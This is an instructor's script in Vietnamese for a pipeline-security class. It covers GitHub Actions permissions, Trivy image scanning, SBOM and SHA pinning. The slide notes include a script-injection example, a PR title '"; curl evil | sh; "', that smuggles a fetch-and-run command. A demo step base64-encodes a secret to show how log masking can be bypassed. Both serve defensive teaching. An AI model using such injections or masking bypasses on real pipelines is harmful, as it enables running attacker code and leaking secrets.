# Kịch bản mentor – Buổi 20: Pipeline Security

::: warning Dành cho mentor
Trang này dành cho người dạy, học viên không cần đọc. Bài học viên: [Buổi 20 – Pipeline Security](../../labs/week-10/session-20.md). Slide: [Slide buổi 20](../../slides/04-cicd/session-20.md). Đáp án và barem: [Walkthrough tuần 10](../walkthroughs/week-10.md), [Chấm điểm tuần 10](../grading/week-10.md).
:::

## Khung thời gian buổi (120 phút)

Mỗi buổi 120 phút: 15' ôn tập, 30' kiến thức và demo, 60' thực hành, 15' review. Buổi thứ hai của tuần dồn vào thực hành, thử thách L2 và review bài làm.

Thời gian gợi ý cho phần thực hành của buổi 20: Phần 1 (rà soát permissions) 15', Phần 2 (quét image) 15', Phần 3 (SBOM) 10', Phần 4 (pin SHA, rà secret) 10'.

## Demo của mentor

Mục tiêu demo: cho lớp thấy một workflow "chạy được nhưng nguy hiểm" và một công cụ tìm ra vấn đề trong image.

1. Mở `.github/workflows/publish.yml` của repo giáo trình. Hỏi lớp: "Job nào cần `packages: write`, job nào không?" Chỉ ra quyền được khai báo ở hai cấp.
2. Thêm tạm một dòng vào bước cuối của workflow thử nghiệm để lộ cách che secret hoạt động:

```yaml
- name: Demo masking
  env:
    DEMO_SECRET: ${{ secrets.DEMO_SECRET }}
  run: |
    echo "raw: $DEMO_SECRET"
    echo "base64: $(echo -n "$DEMO_SECRET" | base64)"
```

Kết quả mong đợi trong log: dòng `raw:` hiện `***`, dòng `base64:` hiện chuỗi base64 thật vì giá trị đã bị biến đổi (không khớp chuỗi bị che). Câu hỏi cho lớp: "Che log có thay thế được việc không in secret không?" (Không.) Xóa bước demo và xoay secret demo sau buổi học.

3. Quét image trước lớp. Ta không mount `docker.sock` vào container quét (mount socket cho container quyền điều khiển Docker daemon, tương đương root trên máy). Thay vào đó xuất image ra file tar rồi cho Trivy đọc file:

```bash
mkdir -p /tmp/scan
docker save club-api:1.0.0 -o /tmp/scan/club-api.tar
docker run --rm \
  -v trivy-cache:/root/.cache/ \
  -v /tmp/scan:/work:ro \
  aquasec/trivy:0.57.1 image --input /work/club-api.tar --severity HIGH,CRITICAL
```

Kết quả mong đợi (rút gọn; số lượng thay đổi theo thời điểm). Trivy 0.57.1 in một khối cho mỗi loại thành phần (gói hệ điều hành `apk`, gói ngôn ngữ `node-pkg`), mỗi khối có dòng `Total`:

```text
/work/club-api.tar (alpine 3.xx)
===============================
Total: 0 (HIGH: 0, CRITICAL: 0)

Node.js (node-pkg)
==================
Total: 3 (HIGH: 3, CRITICAL: 0)
```

Bên dưới dòng `Total` của khối có lỗ hổng là bảng CVE (thư viện, mã CVE, mức độ, phiên bản đã cài, phiên bản vá). Gói `node-pkg` có thể nằm trong `/usr/local/lib/node_modules/npm` (npm đi kèm base image), không phải `express` hay `pg` của ứng dụng: xem cột Library và đường dẫn khi điều tra.

Câu hỏi: "Có thể ra 0 hôm nay và khác 0 ngày mai không? Vì sao?" (Cơ sở dữ liệu CVE cập nhật liên tục; image không đổi nhưng kiến thức về lỗ hổng thì đổi.)

4. Quét một image cũ để thấy sự khác biệt:

```bash
docker pull node:18-alpine
docker save node:18-alpine -o /tmp/scan/node18.tar
docker run --rm \
  -v trivy-cache:/root/.cache/ \
  -v /tmp/scan:/work:ro \
  aquasec/trivy:0.57.1 image --input /work/node18.tar --severity HIGH,CRITICAL
```

Kết quả mong đợi: thường có danh sách CVE (số lượng phụ thuộc thời điểm quét; nếu ra 0 thì bỏ `--severity` để thấy cả mức thấp hơn). Hỏi lớp: "Nên làm gì: bỏ qua, nâng base image, hay vá từng gói?"

## Ghi chú giảng viên theo slide

Các ghi chú dưới đây lấy nguyên từ slide buổi 20 (đã bỏ khỏi slide).

| Slide | Ghi chú |
| --- | --- |
| Mục tiêu buổi học | 2 phút. Câu mở đầu: pipeline là nơi có quyền cao nhất trong dự án, vì sao? |
| Vấn đề action lạ và write-all | Kể câu chuyện 3 phút, không nêu tên sự cố cụ thể. Hỏi lớp: bước nào trong kịch bản này có thể chặn được thiệt hại? |
| Least privilege và permissions | Hỏi: nếu chỉ khai báo `contents: read`, quyền `packages` là gì? Đáp án: none. 3 phút. |
| Quyền theo tầng | Mở `publish.yml` của repo giáo trình, chỉ khai báo ở hai cấp. 2 phút. |
| Secret - làm và không làm | Nhấn mạnh lịch sử git vẫn giữ secret đã commit. 3 phút. |
| Che secret trong log có giới hạn | Demo trên workflow thử nghiệm với secret giả. Xóa bước demo và xoay secret demo sau buổi. 4 phút. |
| Script injection | Hỏi: tiêu đề PR là `"; curl evil \| sh; "` thì chuyện gì xảy ra ở bản nguy hiểm? 3 phút. |
| Pin action theo SHA | Hỏi: vì sao tag có thể bị di chuyển còn SHA thì không? 2 phút. |
| Dependency review và SBOM | Câu hỏi: một CVE nghiêm trọng vừa công bố cho thư viện, bạn tìm ra mình có dùng nó bằng cách nào? 3 phút. |
| Image scanning - Trivy và Docker Scout | Khóa học dùng Trivy làm mặc định vì không cần đăng nhập. 2 phút. |
| Kiến trúc pipeline an toàn | Đi theo hai nhánh pass và fail. Nhắc file mẫu `examples/github-actions/security-scan.yml` để đọc sau lab. 3 phút. |
| Demo quét image bằng Trivy | Lần đầu tải database nên chậm. Hỏi: hôm nay ra 0, ngày mai có thể khác 0 không? Vì sao? 4 phút. |
| Demo quét image cũ để so sánh | Node 18 đã hết vòng đời hỗ trợ nên là ví dụ tốt về base image cũ. 3 phút. |
| Lab L1 - chuẩn bị và rà soát permissions | Hàm `trivy` chỉ có hiệu lực trong phiên shell hiện tại. Phần 1 khoảng 15 phút. Thiếu image `club-api:1.0.0` thì build lại từ `starter-project/backend`. |
| Lab L1 - sửa workflow quyền rộng | Hỏi: vì sao cần hai commit riêng? Đáp án: diff chứng minh việc thu hẹp quyền. 3 phút. |
| Lab L1 - quét, SBOM, pin SHA | Phần 2-4 khoảng 35 phút. SHA placeholder không chạy được nếu để nguyên, học viên phải tra giá trị thật. Có thể thêm `trivy config /project/k8s` để thấy cảnh báo cấu hình. |
| Lab L1 - tìm secret lỡ commit | Nhắc: xóa commit không xóa lịch sử. 3 phút. |
| Lab L2 - workflow security.yml | Học viên tự viết, không chiếu lời giải. Repo private chưa bật dependency graph thì job dependency review sẽ lỗi: thay bằng `npm audit --omit=dev` và ghi nhận trong report. Action bên thứ ba thêm vào phải pin SHA. Giải thích ngưỡng đã chọn trong `report.md`. |
| Lỗi - security gate chặn pipeline | Liên hệ scenario-05 (image build thất bại) về cách điều tra từng bước. Đây là lỗi mà học viên chỉ nhận triệu chứng trước. 5 phút. |
| Lỗi thường gặp | Dùng làm bảng tra khi đi quanh lớp. Tình huống phụ tùy chọn: nhúng `github.head_ref` vào `run:` với tên nhánh chứa dấu nháy để thấy lệnh bị phá. 2 phút. |
| Thử thách và bài nộp | Cho lớp thảo luận 3 phút trước khi nêu đáp án. Dòng cuối README học viên ghi level đã làm (L1 hoặc L2). |
| Recap | Exit ticket: mỗi bạn nêu một thay đổi sẽ áp dụng ngay vào workflow của mình. 15 phút review cuối buổi xem evidence. |

## Lưu ý riêng cho người dạy

- Buổi này tách rõ phần bắt buộc (permissions, một lần quét image) và phần nâng cao (SBOM, pin SHA, workflow `security.yml`). Nếu lớp chậm, chỉ cần hoàn thành phần bắt buộc; SBOM và pin SHA là thử thách ở nhà.
- Luôn dùng secret giả cho demo che log; không dùng secret thật của CLB.
- Kết quả quét đổi theo ngày: hãy quét thử trước buổi để biết lớp sẽ thấy gì, và nhắc học viên ghi thời điểm quét (`date`).
- Lời giải đầy đủ của `security.yml` đã chuyển sang [Walkthrough tuần 10](../walkthroughs/week-10.md); không chiếu cho lớp trước khi học viên thử.
